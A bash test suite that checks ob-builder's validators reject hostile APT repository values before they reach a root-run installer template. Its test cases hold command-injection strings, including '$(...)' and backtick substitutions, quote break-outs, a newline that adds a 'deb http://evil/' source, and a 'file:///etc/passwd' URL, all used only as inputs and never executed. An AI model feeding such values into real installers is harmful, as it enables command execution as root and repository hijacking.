#!/bin/bash
#
# Test suite for ob-builder APT repository input validation (issue #190).
#
# apt_url / apt_suite / apt_component end up inside the
#   deb [signed-by=...] <url> <suite> <component>
# line that is interpolated verbatim into templates/shell/installer.sh.in and
# written to /etc/apt/sources.list.d by a script running as root. Because
# render_template() is a literal bash substitution that preserves every
# character, an unvalidated value could execute a command substitution as root
# or inject extra sources.list entries via an embedded newline.
#
# Sources ob-builder the same way as test_ob_builder_service_accounts.sh (with
# `set -euo pipefail` and the `main "$@"` call stripped) and exercises the
# validators plus validate_inputs() with hostile values.
#

# Nearly every variable set here is read by the ob-builder functions sourced
# below, which shellcheck cannot see through.
# shellcheck disable=SC2034

set -u

TESTS_PASSED=0
TESTS_FAILED=0

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# ob-builder defines its own SCRIPT_DIR, and sourcing it below clobbers ours —
# keep the repo root under a distinct name.
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BUILDER="$REPO_ROOT/admin-builder/ob-builder"
export OB_BUILDER_LIB_DIR="$REPO_ROOT/admin-builder/lib"
export OB_BUILDER_SHARE="$REPO_ROOT/admin-builder"

TEST_TMPDIR=$(mktemp -d)
trap 'rm -rf "$TEST_TMPDIR"' EXIT

# NOTE: both helpers must return 0 — they are used on the right of `&&` in
# `$ok && test_pass ... || test_fail ...`, and `((x++))` returns 1 when x was 0.
test_pass() { echo -e "${GREEN}✓${NC} $1"; ((TESTS_PASSED++)); return 0; }
test_fail() {
    echo -e "${RED}✗${NC} $1"
    [ -n "${2:-}" ] && echo -e "  ${YELLOW}Details:${NC} $2"
    ((TESTS_FAILED++))
    return 0
}

# shellcheck disable=SC1090
eval "$(sed -e 's/^set -euo pipefail$//' -e '/^main "\$@"$/d' "$BUILDER")"
BUILD_DATE="2026-01-01T00:00:00Z"

# A keyring file must exist for validate_inputs() to reach its final check.
FAKE_KEYRING="$TEST_TMPDIR/keyring.gpg"
printf 'not-a-real-keyring\n' > "$FAKE_KEYRING"

# Run validate_inputs() in a subshell with a minimal-but-valid baseline plus
# the caller's overrides. Prints nothing; returns 0 if accepted, non-zero if
# rejected (die() exits non-zero).
#
# Usage: run_validate VAR=value [VAR=value ...]
run_validate() {
    (
        DEPLOYMENT_SLUG="demo"
        SCENARIO="token-only"
        PORTAL_URL="https://sso.example.com"
        CLIENT_ID="open-bastion"
        CLIENT_ID_POLICY="modifiable"
        CLIENT_SECRET_MODE="prompt"
        EMBEDDED_CLIENT_SECRET=""
        SERVER_GROUP="default"
        SERVER_GROUP_POLICY="modifiable"
        TARGET_ROLE="bastion"
        ALLOWED_BASTIONS=""
        AUTO_ENROLL_SETUP="no"
        SELF_DELETE="no"
        INSECURE=0
        APT_URL="https://linagora.github.io/open-bastion"
        APT_SUITE="trixie"
        APT_COMPONENT="main"
        SERVICE_ACCOUNTS_RECORDS=()
        REPO_KEYRING="$FAKE_KEYRING"

        local assignment
        for assignment in "$@"; do
            eval "${assignment%%=*}=\${assignment#*=}"
        done

        validate_inputs
    ) >/dev/null 2>&1
}

# Test 1: syntax check on the two files this suite covers
test_syntax() {
    local ok=true
    bash -n "$BUILDER" || ok=false
    bash -n "$REPO_ROOT/admin-builder/lib/validators.sh" || ok=false
    $ok && test_pass "Syntax check: bash -n passes on ob-builder and validators.sh" \
         || test_fail "Syntax check failed"
}

# Test 2: the suite validator accepts real Debian suites and rejects injection
test_suite_validator() {
    local ok=true
    is_valid_apt_suite "trixie"              || ok=false
    is_valid_apt_suite "bookworm-backports"  || ok=false
    is_valid_apt_suite "stable/updates"      || ok=false
    is_valid_apt_suite "1.0"                 || ok=false

    is_valid_apt_suite ""                            && ok=false   # empty
    is_valid_apt_suite '$(id)'                       && ok=false   # command substitution
    is_valid_apt_suite '`id`'                        && ok=false   # backticks
    is_valid_apt_suite 'trixie main'                 && ok=false   # extra field
    is_valid_apt_suite 'trixie"; id; :"'             && ok=false   # quote break-out
    is_valid_apt_suite $'trixie\ndeb http://evil/ x' && ok=false   # newline injection
    is_valid_apt_suite '-trixie'                     && ok=false   # leading dash

    $ok && test_pass "is_valid_apt_suite: accepts codenames, rejects injection" \
         || test_fail "is_valid_apt_suite returned a wrong result"
}

# Test 3: the component validator
test_component_validator() {
    local ok=true
    is_valid_apt_component "main"                        || ok=false
    is_valid_apt_component "main contrib"                || ok=false
    is_valid_apt_component "main contrib non-free-firmware" || ok=false

    is_valid_apt_component ""                            && ok=false
    is_valid_apt_component '$(touch /tmp/pwned)'         && ok=false
    is_valid_apt_component '`id`'                        && ok=false
    is_valid_apt_component 'main; id'                    && ok=false
    is_valid_apt_component $'main\ndeb http://evil/ x y' && ok=false
    is_valid_apt_component 'main|contrib'                && ok=false

    $ok && test_pass "is_valid_apt_component: accepts component lists, rejects injection" \
         || test_fail "is_valid_apt_component returned a wrong result"
}

# Test 4: validate_inputs() accepts the shipped defaults
test_validate_inputs_accepts_defaults() {
    if run_validate; then
        test_pass "validate_inputs: accepts the default APT repo settings"
    else
        test_fail "validate_inputs rejected the default APT repo settings"
    fi
}

# Test 5: validate_inputs() rejects hostile apt_* values (the #190 regression)
test_validate_inputs_rejects_hostile() {
    local ok=true
    local desc

    # NOTE ON SCOPE: these payloads are never executed by this test, and are
    # not meant to be. The injection point of #190 is the *generated installer
    # running as root at install time*, which this suite does not run. What is
    # asserted here is the only thing that can be asserted without a root
    # sandbox: validate_inputs() refuses every one of these values, so nothing
    # hostile ever reaches the template. An earlier revision also checked for a
    # /tmp/ob-pwned canary; it could not fire (the payloads are inside single
    # quotes and are passed to the validator as literal text), so it was
    # removed rather than left looking like a stronger guarantee than it is.

    # apt_url: command substitution, backticks, quote break-out, newline, non-URL
    run_validate 'APT_URL=https://x/$(touch /tmp/ob-pwned)' && { ok=false; desc="apt_url \$(...)"; }
    run_validate 'APT_URL=https://x/`id`'                   && { ok=false; desc="apt_url backticks"; }
    run_validate 'APT_URL=https://x" ; id ; echo "'         && { ok=false; desc="apt_url quote break-out"; }
    run_validate "APT_URL=$(printf 'https://x\ndeb http://evil/ trixie main')" \
        && { ok=false; desc="apt_url newline"; }
    run_validate 'APT_URL=file:///etc/passwd'               && { ok=false; desc="apt_url non-http scheme"; }
    run_validate 'APT_URL='                                 && { ok=false; desc="apt_url empty"; }

    # apt_suite
    run_validate 'APT_SUITE=$(touch /tmp/ob-pwned)'         && { ok=false; desc="apt_suite \$(...)"; }
    run_validate "APT_SUITE=$(printf 'trixie\ndeb http://evil/ trixie main')" \
        && { ok=false; desc="apt_suite newline"; }
    run_validate 'APT_SUITE=trixie main'                    && { ok=false; desc="apt_suite extra field"; }
    run_validate 'APT_SUITE='                               && { ok=false; desc="apt_suite empty"; }

    # apt_component
    run_validate 'APT_COMPONENT=$(touch /tmp/ob-pwned)'     && { ok=false; desc="apt_component \$(...)"; }
    run_validate "APT_COMPONENT=$(printf 'main\ndeb http://evil/ trixie main')" \
        && { ok=false; desc="apt_component newline"; }
    run_validate 'APT_COMPONENT=main; id'                   && { ok=false; desc="apt_component semicolon"; }
    run_validate 'APT_COMPONENT='                           && { ok=false; desc="apt_component empty"; }

    $ok && test_pass "validate_inputs: rejects hostile apt_url / apt_suite / apt_component" \
         || test_fail "validate_inputs accepted a hostile value" "${desc:-}"
}

# Test 6: a hostile value supplied through the YAML config path is rejected too
# (the questionnaire path and the YAML path share validate_inputs()).
test_yaml_path_rejected() {
    local cfg="$TEST_TMPDIR/hostile.yml"
    cat > "$cfg" <<'YML'
deployment_slug: demo
scenario: token-only
portal_url: https://sso.example.com
target_role: bastion
apt_url: https://x/$(touch /tmp/ob-pwned-yaml)
apt_suite: trixie
apt_component: main
YML

    local out rc
    out=$("$BUILDER" --config "$cfg" --repo-keyring "$FAKE_KEYRING" \
                     --output-shell "$TEST_TMPDIR/out" --dry-run 2>&1); rc=$?

    if [ $rc -ne 0 ] && grep -qi "invalid apt_url" <<<"$out"; then
        test_pass "YAML config path: hostile apt_url refused by the builder"
    else
        test_fail "YAML config path did not refuse hostile apt_url (rc=$rc)" "$out"
    fi
}

# Test 7: what the validation is actually protecting.
#
# The three values land in @@APT_SOURCES_LIST@@, which the installer template
# expands inside a double-quoted bash string passed to atomic_write:
#
#     atomic_write /etc/apt/sources.list.d/open-bastion.list \
#         "@@APT_SOURCES_LIST@@
#     " 0644
#
# render_template() is a literal substitution, so whatever survives validation
# becomes bash source in a script that later runs as root. Executing that
# script is not an option for a test (it installs packages and rewrites
# /etc/apt), so we render the real template both ways and inspect the artefact
# instead:
#
#   - validated values interpolate cleanly, leaving valid bash and exactly one
#     sources.list entry;
#   - the payload validate_inputs() rejects would land as a live command
#     substitution, which is what makes that validation load-bearing.
test_render_shows_what_validation_prevents() {
    local tpl="$REPO_ROOT/admin-builder/templates/shell/installer.sh.in"
    local ok=true desc=""

    if [ ! -f "$tpl" ]; then
        test_fail "installer template not found" "$tpl"
        return
    fi

    # --- validated values survive interpolation unchanged -------------------
    local good_out="$TEST_TMPDIR/installer-good.sh"
    (
        DRY_RUN=0
        ph_reset
        ph_set APT_SOURCES_LIST \
            "deb [signed-by=/etc/apt/keyrings/open-bastion.gpg] https://packages.example.com/open-bastion trixie main"
        render_template "$tpl" "$good_out" "0755"
    ) >/dev/null 2>&1 || { ok=false; desc="render_template failed on valid values"; }

    if [ -s "$good_out" ]; then
        bash -n "$good_out" 2>/dev/null || { ok=false; desc="rendered installer is not valid bash"; }
        grep -q 'https://packages.example.com/open-bastion trixie main' "$good_out" \
            || { ok=false; desc="apt values not interpolated verbatim"; }
        local deb_lines
        deb_lines=$(grep -cF 'deb [signed-by=/etc/apt/keyrings/open-bastion.gpg]' "$good_out" || true)
        [ "$deb_lines" -eq 1 ] || { ok=false; desc="expected 1 deb line, found $deb_lines"; }
    else
        ok=false; desc="${desc:-no installer rendered}"
    fi

    # --- the rejected payload would have reached root ----------------------
    # Rendered, never executed: we only show that it lands as live shell
    # syntax, i.e. the exposure the validator removes.
    local bad_out="$TEST_TMPDIR/installer-bad.sh"
    (
        DRY_RUN=0
        ph_reset
        ph_set APT_SOURCES_LIST \
            'deb [signed-by=/etc/apt/keyrings/open-bastion.gpg] https://x/$(id > /tmp/ob-would-run) trixie main'
        render_template "$tpl" "$bad_out" "0755"
    ) >/dev/null 2>&1

    if [ -s "$bad_out" ]; then
        grep -qF '$(id > /tmp/ob-would-run)' "$bad_out" \
            || { ok=false; desc="payload did not reach the artefact; test premise is wrong"; }
    else
        ok=false; desc="${desc:-second render produced nothing}"
    fi

    # ... and the same payload must be refused long before that.
    run_validate 'APT_URL=https://x/$(id > /tmp/ob-would-run)' \
        && { ok=false; desc="validate_inputs accepted the payload"; }

    # Nothing above executes anything, but be explicit about it.
    [ -e /tmp/ob-would-run ] && { ok=false; desc="a payload ran (/tmp/ob-would-run exists)"; rm -f /tmp/ob-would-run; }

    $ok && test_pass "render: validated values interpolate cleanly; the rejected payload would have been live shell" \
         || test_fail "render/validation relationship not as expected" "${desc:-}"
}

echo "=========================================="
echo "Testing ob-builder APT repo input validation"
echo "=========================================="
echo ""

test_syntax
test_suite_validator
test_component_validator
test_validate_inputs_accepts_defaults
test_validate_inputs_rejects_hostile
test_yaml_path_rejected
test_render_shows_what_validation_prevents

echo ""
echo "=========================================="
echo "Test Summary"
echo "=========================================="
echo -e "${GREEN}Passed:${NC} $TESTS_PASSED"
echo -e "${RED}Failed:${NC} $TESTS_FAILED"
echo "Total:  $((TESTS_PASSED + TESTS_FAILED))"
echo ""

if [ $TESTS_FAILED -eq 0 ]; then
    echo -e "${GREEN}All tests passed!${NC}"
    exit 0
else
    echo -e "${RED}Some tests failed.${NC}"
    exit 1
fi
